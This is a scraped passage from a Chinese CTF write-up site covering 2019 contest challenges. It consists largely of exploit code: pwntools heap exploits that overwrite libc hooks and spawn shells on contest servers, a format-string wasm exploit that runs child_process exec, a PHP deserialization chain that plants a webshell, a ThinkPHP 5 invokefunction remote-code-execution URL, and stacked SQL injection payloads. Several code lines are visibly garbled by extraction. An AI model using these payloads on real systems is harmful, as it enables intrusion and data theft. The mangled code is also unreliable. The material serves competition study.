0xF4F44A15, 0xB7B7B602, 0xE9E9AF8C, 0xB3B3C9F4, 0x70705040, 0xEBEB24F7, 0xD9D97929, 0xF5F5BB9C, 0x93938A32, 0x5858ED03, 0xEFEF5B01, 0x2D2D333C, 0x474783E1, 0xF6F6C16E, 0xFFFFCE62, 0x6464BAD5, 0x0A0A75FE, 0x7676A4CD, 0xCECEE94E, 0x88889B26, 0x1C1C1410, 0x46467268, 0x4C4C0796, 0xFBFBB194, 0x878760A7, 0x4F4F7D64, 0x3030D6A5, 0xBEBEB90E, 0x74742FB6, 0x2F2FB847, 0x5E5E198E, 0x3F3F2D24, 0xC9C9EC4A, 0xD1D187AC, 0xD8D888A0, 0xECEC21F3, 0xE6E6540D, 0x2828BD43, 0x6E6ECF2B, 0x1D1DE599, 0x1414EA95, 0x1F1F6EE2, 0x2222C8BD, 0xA9A92969, 0x68683BA6, 0xF8F8CB66, 0xC5C56D39, 0x3434A953, 0xC3C399B4, 0x202043C6, 0xB0B0B306, 0xF2F2BE98, 0xC8C81DC3, 0x4D4DF61F, 0xDADA03DB, 0x7171A1C9, 0xE5E52EFF, 0xD4D409D3, 0xC4C49CB0, 0x9E9EFAC8, 0x6F6F3EA2, 0x4343FC17, 0x8585EBDC, 0xA0A02665, 0x111164EA, 0xE3C046E3, 0x6087A760, 0xE48CD0E4, 0x2F74B62F, 0x50704050, 0xFF99CCFF, 0x04964D04, 0xD939A9D9, 0x82D6A882, 0x5835DA58, 0x5A7E485A, 0xB06ADDB0, 0x6B18E66B, 0x975BF197, 0xA171C9A1, 0xCF6E2BCF, 0xEA1495EA, 0xB7264BB7, 0x719CB371, 0xED5803ED, 0xE9CE4EE9, 0xF64D1FF6, 0xCEFF62CE, 0x30F7E730, 0x9B88269B, 0x3166AE31, 0x207DBA20, 0x68C23D68, 0x362A3836, 0x91862E91, 0x6DC5396D, 0x6580A365, 0xC56023C5, 0x925CF592, 0xF4068DF4, 0x635D7C63, 0xB82F47B8, 0x38B27D38, 0x8E057F8E, 0x8640E586, 0xA8A51AA8, 0x18CFC718, 0xB1FB94B1, 0xA93453A9, 0x28382028, 0xD2A6E8D2, 0xC22CB5C2, 0xDAE372DA, 0xAE78C5AE, 0xDB723BDB, 0xB56DD9B5, 0xEE82D8EE, 0x3AF9EF3A, 0x5F794C5F, 0xA2AB12A2, 0x42B18F42, 0x32BC7532, 0x859A3E85, 0xF7DC56F7, 0x2EE5FF2E, 0x55774455, 0x79D92979, 0x87D1AC87, 0xA0E080A0, 0x93CDBC93, 0xBD2843BD, 0x5EE8055E, 0x96CAB896, 0x0A0E080A, 0xCBF866CB, 0x8347E183, 0xFB0F81FB, 0x2D3F242D, 0x416B5441, 0xF94413F9, 0xF34A1BF3, 0x6A89AF6A, 0x5BEF015B, 0x7D4F647D, 0xF090C0F0, 0x5CA3975C, 0xC9B3F4C9, 0x16578216, 0x27312C27, 0x4FF3114F, 0x37BB7137, 0xFDD25EFD, 0x7F04F67F, 0x665A7866, 0xC822BDC8, 0xBF63D1BF, 0xD17C33D1, 0x0E98450E, 0x62CC3562, 0x141C1014, 0x6116EE61, 0xAC3357AC, 0x26A06526, 0xE51D99E5, 0x51E10951, 0x3C24303C, 0x0CD3D70C, 0x17C6CB17, 0x40FA1D40, 0x6C54706C, 0x2A73B22A, 0xD7A1ECD7, 0x67CB3167, 0x95106395, 0xBA64D5BA, 0x48BF8748, 0x4627C246, 0x7A03F27A, 0x03DADB03, 0x700DFA70, 0xF8D55AF8, 0x7B92BB7B, 0x840B7784, 0x573CD657, 0x77416C77, 0x108A5D10, 0xD8A8E0D8, 0x4B655C4B, 0x523BD252, 0xD47B37D4, 0xEF1391EF, 0xA33A5BA3, 0x3B68A63B, 0xE18BD4E1, 0x39233439, 0x45FD1945, 0x24EBF724, 0xAAEE88AA, 0x0F090C0F, 0xBCB90ABC, 0xD5EA7ED5, 0x6411EA64, 0xC3BDFCC3, 0x59A49359, 0x1B151C1B, 0xDDAFE4DD, 0x2CAE6D2C, 0x9F1E6B9F, 0x12C1CF12, 0x01914901, 0x05070405, 0x3FFEEB3F, 0x72466872, 0xB6B702B6, 0x9E8F229E, 0x8A93328A, 0x257ABE25, 0x749BB774, 0x09D4D309, 0xE7560BE7, 0x4DB8834D, 0x88D8A088, 0x810C7381, 0x024B9202, 0xC72BB1C7, 0xECC94AEC, 0xF597C4F5, 0x90176790, 0x332D3C33, 0xDC3EADDC, 0x492ECE49, 0x1C598A1C, 0x5D32DE5D, 0xCCB4F0CC, 0x54E60D54, 0x158D5915, 0xC1F66EC1, 0x08459A08, 0x7CDE2D7C, 0x99C3B499, 0xCD25B9CD, 0xF10189F1, 0x1E12181E, 0xFA9EC8FA, 0x53AA9B53, 0x94812A94, 0x8949E989, 0x1F83511F, 0x8DDFA48D, 0xF2DB52F2, 0xB3B006B3, 0xDFE476DF, 0xC06727C0, 0xD630A5D6, 0x9852FD98, 0x13508613, 0xBBF59CBB, 0x2BE2FB2B, 0x22362822, 0x3E6FA23E, 0xE85F07E8, 0xE01A9DE0, 0x3461AA34, 0x9D55F99D, 0x111B1411, 0x3DB5793D, 0x78486078, 0x809D3A80, 0x4320C643, 0x195E8E19, 0xA63D5FA6, 0x00000000, 0xE6C742E6, 0x76D02576, 0x6F8EAB6F, 0xADA21EAD, 0x074C9607, 0x8F94368F, 0x35F0E335, 0xC6BAF8C6, 0x47B68B47, 0xDE753FDE, 0xAB7FC1AB, 0xD0ED7AD0, 0x0B9F410B, 0xD337A1D3, 0xE2510FE2, 0x4E62584E, 0x1DC8C31D, 0x4AF4154A, 0x446C5044, 0xC4F16AC4, 0x9A196F9A, 0x06DDDF06, 0xB2214FB2, 0xA476CDA4, 0x8B027B8B, 0xA7AC16A7, 0xB4FC90B4, 0xFE0885FE, 0xAFE98CAF, 0x69537469, 0xEB85DCEB, 0x73D72173, 0xB9BE0EB9, 0xCA692FCA, 0xA5E784A5, 0x9CC4B09C, 0x21ECF321, 0x23A76123, 0x0D429E0D, 0x7E95BF7E, 0x29A96929, 0x750AFE75, 0x6E1FE26E, 0x56AD9F56, 0x4C29CA4C, 0x8C4EED8C, 0xBEF298BE, 0x1A84551A, 0xFC4317FC, 0x4EED4E8C, 0x196F199A, 0xB883B84D, 0x7ABE7A25, 0x441344F9, 0x8BD48BE1, 0x7DBA7D20, 0xD1ACD187, 0x52FD5298, 0xE476E4DF, 0xDADBDA03, 0x5A785A66, 0xEF01EF5B, 0xA397A35C, 0xA51AA5A8, 0x068D06F4, 0x87A78760, 0x4B924B02, 0x07040705, 0xE372E3DA, 0x0F810FFB, 0xC1CFC112, 0xA969A929, 0x5BF15B97, 0x264B26B7, 0x459A4508, 0x812A8194, 0xEE88EEAA, 0x9436948F, 0xA6E8A6D2, 0x95BF957E, 0xF415F44A, 0x3F243F2D, 0xDC56DCF7, 0xF866F8CB, 0x9845980E, 0xC539C56D, 0x018901F1, 0xDFA4DF8D, 0xB006B0B3, 0x97C497F5, 0x0E080E0A, 0x8EAB8E6F, 0x6C506C44, 0x1FE21F6E, 0xC046C0E3, 0xECF3EC21, 0x6258624E, 0x55F9559D, 0x1E6B1E9F, 0xF0E3F035, 0xDE2DDE7C, 0xD929D979, 0x6FA26F3E, 0xA493A459, 0x7B377BD4, 0x32DE325D, 0x9D3A9D80, 0xF16AF1C4, 0x18E6186B, 0xB90AB9BC, 0x3D5F3DA6, 0x151C151B, 0x335733AC, 0xDB52DBF2, 0x0AFE0A75, 0x82D882EE, 0x1A9D1AE0, 0xF298F2BE, 0xAB12ABA2, 0xCFC7CF18, 0x89AF896A, 0xD3D7D30C, 0xD4D3D409, 0xFB94FBB1, 0x692F69CA, 0x027B028B, 0x74B6742F, 0xE784E7A5, 0xB702B7B6, 0x6E2B6ECF, 0x3CD63C57, 0x47E14783, 0x7FC17FAB, 0x00000000, 0x9BB79B74, 0x602360C5, 0xCB31CB67, 0x04F6047F, 0x61AA6134, 0xD025D076, 0xCC35CC62, 0x1218121E, 0x80A38065, 0x655C654B, 0x8F228F9E, 0xF59CF5BB, 0xC4B0C49C, 0x6DD96DB5, 0x510F51E2, 0x090C090F, 0xFC90FCB4, 0x76CD76A4, 0x11EA1164, 0xAD9FAD56, 0x91499101, 0x90C090F0, 0x9EC89EFA, 0x139113EF, 0xCAB8CA96, 0x36283622, 0x2CB52CC2, 0x71C971A1, 0x5D7C5D63, 0x429E420D, 0xE080E0A0, 0xE5FFE52E, 0x284328BD, 0x312C3127, 0xAC16ACA7, 0x723B72DB, 0xFF62FFCE, 0xB68BB647, 0x40E54086, 0xC94AC9EC, 0xD55AD5F8, 0x560B56E7, 0x4C964C07, 0x68A6683B, 0xCE4ECEE9, 0x5F075FE8, 0x7E487E5A, 0x8A5D8A10, 0xD721D773, 0x4D1F4DF6, 0x30A530D6, 0x25B925CD, 0xCDBCCD93, 0xE2FBE22B, 0xB18FB142, 0x8826889B, 0x2D3C2D33, 0x3EAD3EDC, 0x77447755, 0x73B2732A, 0x5E8E5E19, 0x5CF55C92, 0xBAF8BAC6, 0x53745369, 0x0DFA0D70, 0xEBF7EB24, 0xAA9BAA53, 0x1D991DE5, 0x672767C0, 0x964D9604, 0xBB71BB37, 0x8455841A, 0x78C578AE, 0x214F21B2, 0x6ADD6AB0, 0xD8A0D888, 0xB27DB238, 0xC6CBC617, 0x149514EA, 0x9CB39C71, 0x2BB12BC7, 0xA8E0A8D8, 0xBDFCBDC3, 0x0B770B84, 0x3A5B3AA3, 0xA761A723, 0x99CC99FF, 0x9A3E9A85, 0xA21EA2AD, 0x46684672, 0xFD19FD45, 0x580358ED, 0x8CD08CE4, 0x0C730C81, 0xFA1DFA40, 0x48604878, 0xEA7EEAD5, 0xE98CE9AF, 0x2430243C, 0xA1ECA1D7, 0x057F058E, 0xB4F0B4CC, 0xB3F4B3C9, 0x4F644F7D, 0x6B546B41, 0xE60DE654, 0xBF87BF48, 0x22BD22C8, 0xF311F34F, 0x9332938A, 0x49E94989, 0x416C4177, 0x50865013, 0x92BB927B, 0x088508FE, 0x23342339, 0x598A591C, 0xAFE4AFDD, 0x64D564BA, 0x1C101C14, 0xC3B4C399, 0xE109E151, 0x85DC85EB, 0x753F75DE, 0x7C337CD1, 0x17671790, 0xC742C7E6, 0x345334A9, 0xA065A026, 0x8D598D15, 0xE805E85E, 0xD25ED2FD, 0x66AE6631, 0x2A382A36, 0x4A1B4AF3, 0x8351831F, 0x35DA3558, 0x27C22746, 0xF66EF6C1, 0x20C62043, 0x431743FC, 0xAE6DAE2C, 0x9F419F0B, 0xB579B53D, 0x03F2037A, 0x63D163BF, 0xC8C3C81D, 0xED7AEDD0, 0xFEEBFE3F, 0xD6A8D682, 0x39A939D9, 0x16EE1661, 0x5470546C, 0x3BD23B52, 0x862E8691, 0x1B141B11, 0xBC75BC32, 0xC23DC268, 0xF7E7F730, 0x2F472FB8, 0x70407050, 0xBE0EBEB9, 0x794C795F, 0x38203828, 0x10631095, 0x37A137D3, 0x29CA294C, 0xF9EFF93A, 0xDDDFDD06, 0x2ECE2E49, 0x57825716, 0x7D417402, 0x7E721D1F, 0x8C219648, 0x49DCCA67, 0xA5705A22, 0x62D3DC8F, 0x69189C05, 0xBA7B287A, 0x946305E0, 0x4221C46A, 0xA5B54743, 0x83BE0F59, 0x0A12A2AA, 0x4C4C39E9, 0x8ECECDA6, 0x61F3F52C, 0x97E2077A, 0x2E99A95E, 0xEFE18498, 0x1CD31DA5, 0x456AA5B9, 0x36023F0B, 0xC4ED11CD, 0x02DAC41D, 0xE7CC1901, 0xED14F8A1, 0x94E9F986, 0x2BE2879F, 0x6565BA62, 0x2629D026, 0x8034B8CC, 0x212CD5F4, 0xCDD8BD39, 0x90042ED8, 0x3725D79C, 0x896C0C43, 0x7BE43031, 0xB3546C0D, 0xFD73D395, 0xC136D3B2] overflow_byte = lambda x : x & 0xff overflow_word = lambda x : x & 0xffff overflow_dword = lambda x : x & 0xffffffff overflow_qword = lambda x : x & 0xffffffffffffffff HIBYTE = lambda x : (x >> 24) & 0xff BYTE1 = lambda x : (x >> 8) & 0xff BYTE2 = lambda x : (x >> 16) & 0xff BYTE = lambda x : x & 0xff WORD = lambda x : x & 0xffff def ror4(data, bits): for i in range(bits): if data & 1: data >>= 1 data |= 0x80000000 else: data >>= 1 return overflow_dword(data) def rol4(data, bits): for i in range(bits): if data & 0x80000000: data > 8)) + chr(HIBYTE(arr[2])) + struct.pack('I', arr[3]) + struct.pack('I', arr[0]) + struct.pack('H', WORD(arr[1])) + chr(BYTE2(arr[1])) + chr(HIBYTE(arr[1])) def encrypt_ojbk(data): assert len(data) == 32 check_in = lambda x: x in \"abcdef0123456789\" for i in xrange(len(data)): if not check_in(data[i]): os.exit(0) first_list = [0] * 16 for i in xrange(0, len(data), 2): tmp_index = int(data[i], 16) tmp_var = int(data[i + 1], 16) if first_list[tmp_index]: print \"input error\" os.exit(1) else: first_list[tmp_index] = tmp_var j = 0 flag1 = 0 flag2 = 0 second_list = [0] * 24 for x in xrange(24): if x % 6 == 0: second_list[x] = first_list[((-1 % 16) + flag1 * 4) % 16] flag1 += 1 elif x % 6 == 5: second_list[x] = first_list[((4 % 16) + flag2 * 4) % 16] flag2 += 1 else: second_list[x] = first_list[j] j += 1 concat_byte = lambda x, y: x PWN easy heap from pwn import * context(arch = 'amd64',os='linux') def add(size): p.recvuntil('>>') p.sendline('1') p.recvuntil('Size') p.sendline(str(size)) p.recvuntil('0x') return p.recv(12) def dele(idx): p.recvuntil('>>') p.sendline('2') p.recvuntil('Index') p.sendline(str(idx)) def edit(idx,cont): p.recvuntil('>>') p.sendline('3') p.recvuntil('Index') p.sendline(str(idx)) p.recvuntil('Content') p.send(cont) libc = ELF('./libc.so.6') #p = process('./easy_heap',env={'LD_PRELOAD':'./libc-2.23.so'}) p = remote('132.232.100.67', 10004) p.recvuntil('0x') mmap_addr = int(p.recvuntil('\\n')[:-1],16) print hex(mmap_addr) ptr_addr = int(add(0x100-8),16)#0 info(\"ptr:0x%x\",ptr_addr) add(0xf8)#1 add(0xf8)#2 edit(0,p64(0)+p64(0xf1)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)+(0x100-8-16-8-16)*'\\x00'+p64(0xf0)) dele(1) #edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8)+p64(0x90)+p64(ptr_addr+0x30-8)+p64(0)+p64(0x91)+'\\x00'*0x80+p64(0x90)+p64(0x91)+'\\n') add(0x80)#1 add(0x80)#3 add(0x80)#4 dele(1) dele(4) edit(0,p64(0)+p64(0)+p64(0x200)+p64(ptr_addr-8+0x50)+p64(0x200)+p64(mmap_addr)+p64(0)*2+p64(0x80)+'\\x28\\n') edit(3,p64(ptr_addr+0x40)+'\\n') add(128) a = 0x16# int(raw_input(\"a\"),16) edit(0,p64(0x200)+'\\x20'+chr(a)+'\\n') edit(5,p64(0xfbad3c80)+p64(0)*3+p8(0)+'\\n') p.recvuntil(p64(0)*3) addr = u64(p.recv(8)) libc_base = addr - (0x7f7af9dfa6e0-0x7f7af9a37000) print hex(libc_base) free_hook = libc_base+libc.symbols['__free_hook'] sh = asm(shellcraft.sh()) edit(1,sh+'\\n') edit(0,p64(0x200)+p64(free_hook)+'\\n') edit(5,p64(mmap_addr)+'\\n') p.sendline('2') p.sendline('0') p.interactive() one heap 用hbase爆破pbase的1/8192变态house of Roman + 1/1的house of three from pwn import * context.arch = \"amd64\" context.aslr = False libc = ELF(\"./libc-2.27.so\") def add(size,data,shift = False): io.sendlineafter(\"choice:\",str(1)) io.sendlineafter(\"size\",str(size)) if(shift == False): io.sendlineafter(\"content:\",data) else: io.sendafter(\"content:\",data) def rm(): io.sendlineafter(\"choice:\",str(2)) while(True): try: #io = process(\"./one_heap\",env = {\"LD_PRELOAD\":\"./libc-2.27.so\"}) io = remote('47.104.89.129',10001) add(0x60,'0000') rm() rm() add(0x60,'\\x20\\x60\\x64') add(0x60,' ') add(0x60,'\\n',shift = True) add(0x60,p64(0xfbad1880)+p64(0)*3+\"\\x58\") lbase = u64(io.recv(6).ljust(8,'\\x00'))-libc.sym['_IO_file_jumps'] success(\"LBASE -> %#x\"%lbase) add(0x40,'0000') rm() rm() add(0x40,p64(lbase+libc.sym['__realloc_hook'])) add(0x40,p64(lbase+libc.sym['__realloc_hook'])) one = 0x4f2c5 add(0x40,p64(lbase+one)+p64(lbase+libc.sym['realloc']+0xe)) add(0x30,\"cat flag\\x00\") #gdb.attach(io,'handle SIGALRM nostop noprint') io.interactive() raw_input() except Exception,e: info(str(Exception)+str(e)) io.close() two heap 0x1 0x8 0x10 0x18绕size check(都是生成0x20的堆块) from pwn import * context.arch = 'amd64' #context.aslr = False libc = ELF(\"./libc-2.26.so\") def add(size,data): io.sendlineafter(\"choice:\",\"1\") io.sendlineafter(\"size:\\n\",str(size)) io.sendafter(\"note:\\n\",data) def rm(idx): io.sendlineafter(\"choice:\",\"2\") io.sendlineafter(\"index:\\n\",str(idx)) while(True): try: io = remote('47.104.89.129',10002) #io = process(\"./two_heap\",env = {\"LD_PRELOAD\":\"./libc-2.26.so\"}) io.sendlineafter(\"SCTF:\\n\",\"%a%a%a%a%a\") io.recvuntil(\"0x0.0\") lbase = (int(io.recv(11),16) %#x\"%lbase) add(1,'') rm(0);rm(0);ls add(8,p64(lbase+libc.sym['__free_hook'])) add(0x10,'\\n') add(24,p64(lbase+libc.sym['system'])+'\\n') add(40,\"/bin/sh\\x00\"+\"\\n\") io.sendline(\"2\") io.sendline(\"4\") #gdb.attach(io,'handle SIGALRM nostop noprint') io.interactive() raw_input() except Exception,e: info(str(e)) io.close() easywasm 出题人：0xd5f 解题人数：0 最终分数：1000 程序存在一个结构体用于保存信息记录 C struct { char *username; int password; char *introduction; void (*state)(const char *); } record; 先说三个函数逻辑 registered()用于初始化record结构体 profile()用于打印username和introduction login()用于验证username和password并通过state函数指针返回登录成功或失败的状态信息 因为程序存在Z_envZ__emen_run_Z_vi,只需要改变state即可,但是如果成功调用,还需要泄露出password 其中profile()存在一个溢出漏洞和一个格式化字符串漏洞,通过溢出,我们可以控制任意写的地址,然后再leak出password即可,许多payload的细节可以调试知道 不过带师傅们好像更热衷于ddos,Orz exp import requests url = 'http://47.104.89.129:23333/' registered = url + 'registered' profile = url + 'profile' login = url + 'login' username = 'username' password = 'password' introduction = 'introduction' payload = '' payload += 'A'*7 payload += ''' const exec=require(\"child_process\").exec; exec(\"cat flag\", function(error,stdout,stderr){process.stdout.write(stdout);}); '''.ljust(0x7f, ' ') payload += '//\\x3C\\x0D\\x00' params = { username: '%2$0141d%1$n', introduction: payload } requests.get(registered, params=params) req = requests.get(profile) passwd = req.text.lstrip('Welcome, ').rstrip('Your introduction: AAAAAAA') params = { username: '%2$0141d%1$n', password: passwd } requests.get(login, params=params) 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-06-27 16:05:58 0 issues reported "},"articals/2019qiangwang.html":{"url":"articals/2019qiangwang.html","title":"2019强网杯","keywords":"","body":"2019强网杯 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 难 题目下载： https://github.com/glzjin/qwb_2019_smarthacker https://github.com/glzjin/qwb_2019_upload https://github.com/glzjin/qwb_2019_supersqli https://github.com/FlappyPig/QWB-2019 网上公开WP: https://github.com/FlappyPig/QWB-2019 https://www.zhaoj.in/read-5873.html https://mp.weixin.qq.com/s/6w9cW4k1m9SjEHyfP_maSg https://xz.aliyun.com/t/5290 https://xz.aliyun.com/t/5279 http://cdusec.happyhacking.top/?post=75 https://www.anquanke.com/post/id/179386 https://altman.vip/2019/05/27/QWB2019-writeup/ http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485809&idx=1&sn=5bde7da3fb89627829e037d2df960e7b&chksm=e89e21a9dfe9a8bf6cde9b14462193f5865a8ad78d75e77fb567717447a837cc189e42d41e27&mpshare=1&scene=23&srcid=#rd https://mochazz.github.io/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/ 本站备份WP 感谢作者: Glzjin、Donek1、wu1a、admin-琴里、 白帽100安全攻防实验室【公众号同名】 Web UPLOAD 知识点：代码审计，PHP 反序列化。 步骤： 1.先打开靶机看看。 2.看起来是个登录和注册页面，那么就先注册然后登录试试吧。 3.登录之后看到这样一个页面，测了一下只能上传能被正常查看的 png。 4.跳转到了一个新的页面，这个页面似乎没有任何实际功能了。然后可以看到我们图片是正确被上传到服务器上的 /upload/da5703ef349c8b4ca65880a05514ff89/ 下了。 5.然后我们来扫扫敏感文件，发现 /www.tar.gz 下有内容（其实是从第二题得到的提示），下载下来解压看看，发现是 ThinkPHP 5 框架写的。 www.tar.gz下载 6.而且其有 .idea 目录，我们将其导入到 PHPStorm 看看吧。 7.发现其在 application/web/controller/Register.php 和 application/web/controller/Index.php 下有两个断点，很诡异，估计是 Hint 了。 application/web/controller/Register.php： application/web/controller/Index.php： 8.看了看，发现这两个点的流程大概如下。 application/web/controller/Index.php 里的： 首先访问大部分页面例如 index 都会调用 login_check 方法。 该方法会先将传入的用户 Profile 反序列化，而后到数据库中检查相关信息是否一致。 application/web/controller/Register.php 里的： Register 的析构方法，估计是想判断注没注册，没注册的给调用 check 也就是 Index 的 index 方法，也就是跳到主页了。 9.然后再来审一下其他代码，发现上传图片的主要逻辑在 application/web/controller/Profile.php 里。 先检查是否登录，然后判断是否有文件，然后获取后缀，解析图片判断是否为正常图片，再从临时文件拷贝到目标路径。 而 Profile 有 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。 看起来似乎天衣无缝。 但别忘了前面我们有反序列化和析构函数的调用，结合这三个地方我们就可以操控 Profile 里的参数，控制其中的 upload_img 方法，这样我们就能任意更改文件名，让其为我们所用了。 11.首先用蚁剑生成个马，再用 hex 编辑器构造个图片马，注册个新号上传上去。 12.然后构造一个 Profile 和 Register 类，命名空间 app\\web\\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 ['index' => 'img']，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。 而后我们又赋值控制 filename_tmp 和 filename 成员变量。可以看到前面两个判断我们只要不赋值和不上传变量即可轻松绕过。ext 这里也要赋值，让他进这个判断。而后程序就开始把 filename_tmp 移动到 filename，这样我们就可以把 png 移动为 php 文件了。 而后，我们还要构造一个 Register，checker 赋值为 我们上面这个 $profile，registed 赋值为 false，这样在这个对象析构时就会调用 profile 的 index 方法，再跳到 upload_img 了。 13.最终 Poc 生成脚本如下，PHP 的。 except[$name]; } public function __call($name, $arguments) { if($this->{$name}){ $this->{$this->{$name}}($arguments); } } } class Register { public $checker; public $registed; public function __destruct() { if(!$this->registed){ $this->checker->index(); } } } $profile = new Profile(); $profile->except = ['index' => 'img']; $profile->img = \"upload_img\"; $profile->ext = \"png\"; $profile->filename_tmp = \"../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.png\"; $profile->filename = \"../public/upload/da5703ef349c8b4ca65880a05514ff89/e6e9c48368752b260914a910be904257.php\"; $register = new Register(); $register->registed = false; $register->checker = $profile; echo urlencode(base64_encode(serialize($register)));` 注意这里的文件路劲，看 Profile 的构造方法有切换路径，这里我们反序列化的话似乎不会调用构造方法，所以得自己指定一下路径。 14.运行，得到 Poc。 TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkL2RhNTcwM2VmMzQ5YzhiNGNhNjU4ODBhMDU1MTRmZjg5L2U2ZTljNDgzNjg3NTJiMjYwOTE0YTkxMGJlOTA0MjU3LnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC9kYTU3MDNlZjM0OWM4YjRjYTY1ODgwYTA1NTE0ZmY4OS9lNmU5YzQ4MzY4NzUyYjI2MDkxNGE5MTBiZTkwNDI1Ny5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9 15.然后置 coookie。 16.刷新页面。 17.可以看到我们的小马已经能访问了。 18.然后蚁剑连上，打开 /flag 文件。 19.Flag 到手~ 高明的黑客 知识点：代码审计，动态测试 步骤： 1.打开靶机，是这样一个页面。 2.那就下载源码吧。 下载 3.来看看，发现大部分文件都是一些垃圾代码，难以解读。 但有些地方是能看的，比如 前头赋值，神仙难救。 神仙难救。 神仙难救。 4.但总有些地方可用的，来写个脚本批量扫描一下 _GET 和 _POST，给他们传一些特定的代码(比如 echo(\"glzjin\"); /echo(\"glzjin\") / echo glzjin，eval，assert，system 函数需要分别处理，一个文件需要用几种姿势多测几次)看看能执行不，能执行返回这种特定的字符串就说明此处可用。 Python 脚本如下： import os import threading from concurrent.futures.thread import ThreadPoolExecutor import requests session = requests.Session() path = \"/Users/jinzhao/PhpstormProjects/qwb/web2/\" # 文件夹目录 files = os.listdir(path) # 得到文件夹下的所有文件名称 mutex = threading.Lock() pool = ThreadPoolExecutor(max_workers=50) def read_file(file): f = open(path + \"/\" + file); # 打开文件 iter_f = iter(f); # 创建迭代器 str = \"\" for line in iter_f: # 遍历文件，一行行遍历，读取文本 str = str + line # 获取一个页面内所有参数 start = 0 params = {} while str.find(\"$_GET['\", start) != -1: pos2 = str.find(\"']\", str.find(\"$_GET['\", start) + 1) var = str[str.find(\"$_GET['\", start) + 7: pos2] start = pos2 + 1 params[var] = 'echo(\"glzjin\");' # print(var) start = 0 data = {} while str.find(\"$_POST['\", start) != -1: pos2 = str.find(\"']\", str.find(\"$_POST['\", start) + 1) var = str[str.find(\"$_POST['\", start) + 8: pos2] start = pos2 + 1 data[var] = 'echo(\"glzjin\");' # print(var) # eval test r = session.post('http://localhost:11180/web2/' + file, data=data, params=params) if r.text.find('glzjin') != -1: mutex.acquire() print(file + \" found!\") mutex.release() # assert test for i in params: params[i] = params[i][:-1] for i in data: data[i] = data[i][:-1] r = session.post('http://localhost:11180/web2/' + file, data=data, params=params) if r.text.find('glzjin') != -1: mutex.acquire() print(file + \" found!\") mutex.release() # system test for i in params: params[i] = 'echo glzjin' for i in data: data[i] = 'echo glzjin' r = session.post('http://localhost:11180/web2/' + file, data=data, params=params) if r.text.find('glzjin') != -1: mutex.acquire() print(file + \" found!\") mutex.release() # print(\"====================\") for file in files: # 遍历文件夹 if not os.path.isdir(file): # 判断是否是文件夹，不是文件夹才打开 # read_file(file) pool.submit(read_file, file) 5.然后在本地开个 PHP 服务器。 /usr/bin/php -S localhost:11180 -t /Users/jinzhao/PhpstormProjects/qwb 6.运行脚本，开扫，扫到一个咯~ 7.去这个文件里看看。这一段是关键，拼接了一个 System 出来调用 Efa5BVG 这个参数。 8.OK，那么就来试试读取 flag 吧。访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag Flag 到手~ 强网先锋-上单 知识点：通用组件已知漏洞熟悉度- -？ 1.打开靶机，发现似乎可以遍历目录。 2.点进去看看，似乎是 ThinkPHP。 3.看看 Readme，似乎是 ThinkPHP 5.0? 4.直接上次去防灾打比赛的 payload 一把梭。 /1/public/index?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag Flag 到手~ 随便注 知识点：堆叠注入 步骤： 1.打开靶机，发现是这样一个页面。 2.然后提交试试。发现似乎是直接把返回的原始数据给返回了。 3.然后来测试一下有没有注入，似乎是有的。 /?inject=1%27or+%271%27%3D%271 /?inject=1' or '1'='1 4.来检查一下过滤情况，过滤函数如下。 过滤了 select，update，delete，drop，insert，where 和 点。 5.咦，过滤了那么些词，是不是有堆叠注入？一测，还真有。下面列出数据库试试。 /?inject=222%27%3Bshow+databases%3B%23 /?inject=222';show databases;# OK,可以。那看看有啥表。 /?inject=222%27%3Bshow+tables%3B%23 /?inject=222';show tables;# 7.来看看这个数字为名字的表里有啥。看来 flag 在这了。 /?inject=222%27%3Bshow+columns%20from%201919810931114514%3B%23 /?inject=222';show columns from1919810931114514;# 8.然后是 words 表，看起来就是默认查询的表了。 /?inject=222%27%3Bshow+columns%20from%20words%3B%23 /?inject=222';show columns fromwords;# 9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。 先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。 这样就可以让程序直接查询出 flag 了。 10.构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -） /?inject=1%27;RENAME%20TABLE%20`words`%20TO%20`words1`;RENAME%20TABLE%20`1919810931114514`%20TO%20`words`;ALTER%20TABLE%20`words`%20CHANGE%20`flag`%20`id`%20VARCHAR(100)%20CHARACTER%20SET%20utf8%20COLLATE%20utf8_general_ci%20NOT%20NULL;show%20columns%20from%20words;# /?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` 